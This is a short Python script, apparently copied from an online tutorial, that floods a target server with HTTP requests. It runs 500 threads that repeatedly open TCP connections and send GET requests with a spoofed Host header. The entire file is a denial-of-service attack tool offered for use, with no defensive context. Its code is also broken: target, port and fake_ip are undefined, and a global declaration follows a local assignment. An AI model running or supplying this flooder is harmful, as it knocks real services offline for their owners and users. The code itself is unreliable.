import socket
import threading

#https://www.neuralnine.com/code-a-ddos-script-in-python/

def attack():
    attack_num = 0

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        print(attack_num)
        
        s.close()


def main():
    for i in range(500):
        thread = threading.Thread(target=attack)
        thread.start()

if __name__ == "__main__":
    main()